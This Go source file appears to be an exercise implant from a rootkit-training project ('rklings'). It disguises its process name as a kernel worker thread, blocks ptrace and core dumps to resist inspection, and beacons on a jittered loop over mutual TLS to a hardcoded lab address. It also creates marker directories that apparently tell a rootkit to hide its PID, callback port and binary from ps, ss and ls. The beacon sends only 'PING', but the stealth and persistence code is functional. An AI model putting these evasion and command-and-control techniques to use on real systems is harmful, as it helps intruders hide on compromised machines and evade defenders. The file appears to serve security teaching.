package main

import (
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

const (
	defaultServerAddr = "10.0.2.2:8443"
	baseDelay         = 30 * time.Second
	jitterMax         = 30 * time.Second
)

func main() {
	// Masquerade as a kernel thread. The name fits in TASK_COMM_LEN (16 bytes).
	var name [16]byte
	copy(name[:], "[kworker/0:1]")
	unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)

	// Prevent ptrace attach and /proc/pid/mem reads.
	unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)

	// Prevent core dumps from leaking memory contents.
	unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
	if os.Getenv("RKLINGS_REPORT_SECURITY") == "1" {
		var limit unix.Rlimit
		_ = unix.Getrlimit(unix.RLIMIT_CORE, &limit)
		dumpable, _ := unix.PrctlRetInt(unix.PR_GET_DUMPABLE, 0, 0, 0, 0)
		fmt.Printf("dumpable=%d core=%d\n", dumpable, limit.Cur)
		return
	}

	// Load certs and connect with mTLS.
	caPEM, err := os.ReadFile("ca.crt")
	if err != nil {
		log.Fatalf("read CA: %v", err)
	}
	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(caPEM)

	cert, err := tls.LoadX509KeyPair("agent.crt", "agent.key")
	if err != nil {
		log.Fatalf("load agent cert: %v", err)
	}

	tlsCfg := &tls.Config{
		RootCAs:      pool,
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS13,
	}

	for {
		conn, err := tls.Dial("tcp", envOr("RKLINGS_SERVER_ADDR", defaultServerAddr), tlsCfg)
		if err != nil {
			log.Printf("dial: %v", err)
			time.Sleep(jitter(delay("RKLINGS_BASE_DELAY", baseDelay), delay("RKLINGS_JITTER_MAX", jitterMax)))
			continue
		}

		// Auto-hide: PID from ps, callback port from ss, binary from ls.
		os.Mkdir(fmt.Sprintf("rklings.h.i.%d", os.Getpid()), 0)
		if local, ok := conn.LocalAddr().(*net.TCPAddr); ok {
			os.Mkdir(fmt.Sprintf("rklings.h.p.%d", local.Port), 0)
		}
		os.Mkdir(fmt.Sprintf("rklings.h.f.%s", filepath.Base(os.Args[0])), 0)

		fmt.Fprintf(conn, "PING\n")
		conn.Close()

		time.Sleep(jitter(delay("RKLINGS_BASE_DELAY", baseDelay), delay("RKLINGS_JITTER_MAX", jitterMax)))
	}
}

func delay(name string, fallback time.Duration) time.Duration {
	value := os.Getenv(name)
	if value == "" {
		return fallback
	}
	parsed, err := time.ParseDuration(value)
	if err != nil || parsed <= 0 {
		return fallback
	}
	return parsed
}

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

// jitter returns base + a random offset in [0, spread) using crypto/rand.
func jitter(base, spread time.Duration) time.Duration {
	var buf [8]byte
	rand.Read(buf[:])
	n := binary.LittleEndian.Uint64(buf[:])
	return base + time.Duration(n%uint64(spread))
}
